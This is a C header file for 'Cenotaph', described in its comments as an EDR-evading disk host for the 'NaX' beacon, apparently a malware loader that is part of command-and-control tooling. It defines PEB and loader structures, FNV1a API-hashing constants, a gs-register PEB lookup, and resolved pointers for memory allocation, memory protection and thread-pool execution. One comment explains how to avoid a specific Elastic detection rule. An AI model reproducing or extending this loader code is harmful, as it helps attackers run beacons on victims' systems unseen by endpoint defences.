/*
 * Cenotaph — EDR-fit disk host for the NaX beacon.
 * Cenotaph.h: types, hash constants, INSTANCE, casting helpers.
 *
 * FNV1a seed/prime and module hash constants are byte-identical to NaX
 * (src_loader/include/Defs.h) so LdrModulePeb resolves the same modules.
 *
 * Cenotaph is a *normal* native PE (not PIC shellcode), so it may keep a
 * file-scope INSTANCE in .bss — no TLS egghunter, no PIC constraints.
 */
#ifndef CENOTAPH_H
#define CENOTAPH_H

#include <windows.h>
#include <intrin.h>

/* ---- casting helpers (mirror NaX Macros.h subset) ---- */
#define C_PTR( x )   ( ( PVOID    ) ( x ) )
#define U_PTR( x )   ( ( UINT_PTR ) ( x ) )
#define A_PTR( x )   ( ( PCHAR    ) ( x ) )
#define W_PTR( x )   ( ( PWCHAR   ) ( x ) )
#define C_DEF32( x ) ( * ( UINT32* ) ( x ) )

/* ---- FNV1a-32 (case-insensitive) — identical to NaX ---- */
#define H_MAGIC_KEY       0x811c9dc5
#define H_MAGIC_PRIME     0x01000193
#define H_MODULE_NTDLL    0x318a7963
#define H_MODULE_KERNEL32 0x04a1a06a

/* Cenotaph is a normal PE: no .text$B section grouping, no PIC extraction. */
#define FUNC

/* ---- PEB / LDR (full x64 layout; mingw <winternl.h> ships only a partial
 *      PEB_LDR_DATA / LDR_DATA_TABLE_ENTRY, so we define our own — same
 *      approach as NaX's Native.h). ---- */
typedef struct _CEN_UNICODE_STRING {
    USHORT Length;
    USHORT MaximumLength;
    PWSTR  Buffer;
} CEN_UNICODE_STRING;

typedef struct _CEN_PEB_LDR_DATA {
    ULONG      Length;
    ULONG      Initialized;        /* BOOL, 4 bytes */
    PVOID      SsHandle;
    LIST_ENTRY InLoadOrderModuleList;       /* +0x10 */
    LIST_ENTRY InMemoryOrderModuleList;
    LIST_ENTRY InInitializationOrderModuleList;
} CEN_PEB_LDR_DATA, *PCEN_PEB_LDR_DATA;

typedef struct _CEN_LDR_DATA_TABLE_ENTRY {
    LIST_ENTRY    InLoadOrderLinks;          /* +0x00 */
    LIST_ENTRY    InMemoryOrderLinks;        /* +0x10 */
    LIST_ENTRY    InInitializationOrderLinks;/* +0x20 */
    PVOID         DllBase;                   /* +0x30 */
    PVOID         EntryPoint;                /* +0x38 */
    ULONG         SizeOfImage;               /* +0x40 */
    ULONG         _pad0;                     /* +0x44 */
    CEN_UNICODE_STRING FullDllName;          /* +0x48 */
    CEN_UNICODE_STRING BaseDllName;          /* +0x58 */
} CEN_LDR_DATA_TABLE_ENTRY, *PCEN_LDR_DATA_TABLE_ENTRY;

typedef struct _CEN_PEB {
    UCHAR  InheritedAddressSpace;   /* +0x00 */
    UCHAR  ReadImageFileExecOptions;/* +0x01 */
    UCHAR  BeingDebugged;           /* +0x02 */
    UCHAR  BitField;                /* +0x03 */
    PVOID  Mutant;                  /* +0x08 */
    PVOID  ImageBaseAddress;        /* +0x10 */
    PCEN_PEB_LDR_DATA Ldr;          /* +0x18 */
} CEN_PEB, *PCEN_PEB;

/* PEB from gs:[0x60] — no API call. */
static __inline__ PCEN_PEB CenPeb( void ) {
    return (PCEN_PEB) __readgsqword( 0x60 );
}

/* ------------------------------------------------------------------ *
 *  Resolved API function-pointer types.
 *  ntdll stubs are reached via PEB walk + export-table resolution and
 *  called through their own ntdll wrappers — NO private `syscall`
 *  instruction, NO indirect-syscall gadget.  Per the fork's live-
 *  validated CRTL/Elastic lesson (LESSONS P1 CRTL revision), direct
 *  ntdll-stub calls avoid the `image_indirect_call` behaviour that
 *  trips Elastic rule e7d63d66; indirect/direct syscalls are pure
 *  downside vs Elastic.
 * ------------------------------------------------------------------ */

typedef LONG NTSTATUS;
#define NT_SUCCESS(s) ( ((NTSTATUS)(s)) >= 0 )

typedef NTSTATUS (NTAPI *PFN_NtAllocateVirtualMemory)(
    HANDLE ProcessHandle, PVOID *BaseAddress, ULONG_PTR ZeroBits,
    SIZE_T *RegionSize, ULONG AllocationType, ULONG Protect );

typedef NTSTATUS (NTAPI *PFN_NtProtectVirtualMemory)(
    HANDLE ProcessHandle, PVOID *BaseAddress, SIZE_T *RegionSize,
    ULONG NewProtect, PULONG OldProtect );

typedef NTSTATUS (NTAPI *PFN_NtQuerySystemInformation)(
    ULONG SystemInformationClass, PVOID SystemInformation,
    ULONG SystemInformationLength, PULONG ReturnLength );

typedef NTSTATUS (NTAPI *PFN_TpAllocWork)(
    PTP_WORK *WorkReturn, PTP_WORK_CALLBACK Callback,
    PVOID Context, PVOID CallbackEnvironment );

typedef VOID (NTAPI *PFN_TpPostWork)( PTP_WORK Work );
typedef VOID (NTAPI *PFN_TpReleaseWork)( PTP_WORK Work );

/* kernel32 (PEB-walked) */
typedef DWORD  (WINAPI *PFN_GetModuleFileNameW)( HMODULE, LPWSTR, DWORD );
typedef HANDLE (WINAPI *PFN_CreateFileW)( LPCWSTR, DWORD, DWORD,
    LPSECURITY_ATTRIBUTES, DWORD, DWORD, HANDLE );
typedef BOOL   (WINAPI *PFN_ReadFile)( HANDLE, LPVOID, DWORD, LPDWORD, LPOVERLAPPED );
typedef DWORD  (WINAPI *PFN_GetFileSize)( HANDLE, LPDWORD );

/* ------------------------------------------------------------------ *
 *  SYSTEM_BASIC_INFORMATION (NtQuerySystemInformation class 0).
 *  NumberOfProcessors is a CCHAR at the tail of the struct.
 * ------------------------------------------------------------------ */
typedef struct _CEN_SYS_BASIC {
    ULONG      Reserved;
    ULONG      TimerResolution;
    ULONG      PageSize;
    ULONG      NumberOfPhysicalPages;
    ULONG      LowestPhysicalPageNumber;
    ULONG      HighestPhysicalPageNumber;
    ULONG      AllocationGranularity;
    ULONG_PTR  MinimumUserModeAddress;
    ULONG_PTR  MaximumUserModeAddress;
    ULONG_PTR  ActiveProcessorsAffinityMask;
    CCHAR      NumberOfProcessors;
} CEN_SYS_BASIC;

#define SystemBasicInformation 0

/* ------------------------------------------------------------------ *
 *  INSTANCE — every PEB-walked API pointer lives here.
 * ------------------------------------------------------------------ */
typedef struct _CEN_INSTANCE {

    struct {
        /* ntdll (syscall boundary — own wrapper, no indirect) */
        PFN_NtAllocateVirtualMemory  NtAllocateVirtualMemory;
        PFN_NtProtectVirtualMemory   NtProtectVirtualMemory;
        PFN_NtQuerySystemInformation NtQuerySystemInformation;
        PFN_TpAllocWork              TpAllocWork;
        PFN_TpPostWork               TpPostWork;
        PFN_TpReleaseWork            TpReleaseWork;

        /* kernel32 (PEB-walked; mundane I/O + path + uptime) */
        PFN_GetModuleFileNameW       GetModuleFileNameW;
        PFN_CreateFileW              CreateFileW;
        PFN_ReadFile                 ReadFile;
        PFN_GetFileSize              GetFileSize;
    } Api;

    struct {
        PVOID Ntdll;
        PVOID Kernel32;
    } Mod;

} CEN_INSTANCE, *PCEN_INSTANCE;

extern CEN_INSTANCE g_Inst;
#define Inst() (&g_Inst)

/* Ldr.c */
PVOID  LdrModulePeb( ULONG Hash );
PVOID  LdrFunction( PVOID Library, ULONG Function );

/* Utils.c */
ULONG  HashString( PVOID String, SIZE_T Length );

#endif /* CENOTAPH_H */